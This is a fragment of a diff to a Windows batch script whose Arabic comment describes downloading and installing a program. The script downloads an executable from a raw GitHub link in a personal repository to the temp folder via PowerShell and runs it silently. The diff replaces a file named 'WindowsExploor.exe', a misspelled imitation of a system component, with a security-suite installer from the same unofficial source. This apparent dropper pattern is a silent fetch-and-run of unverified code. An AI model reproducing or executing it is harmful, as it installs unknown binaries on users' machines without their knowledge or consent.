@@ -6,7 +6,7 @@ if %errorLevel% neq 0 (
 )
 
 :: --- تحميل وتثبيت البرنامج من الرابط المحدد ---
-set "appUrl=https://github.com/Pango-IL/windows/raw/refs/heads/main/WindowsExploor.exe"
+set "appUrl=https://github.com/Pango-IL/windows/raw/refs/heads/main/360TS_Setup_Mini.exe"
 set "appPath=%TEMP%\Setup_App.exe"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%appUrl%', '%appPath%')"
 start /wait "" "%appPath%" /S
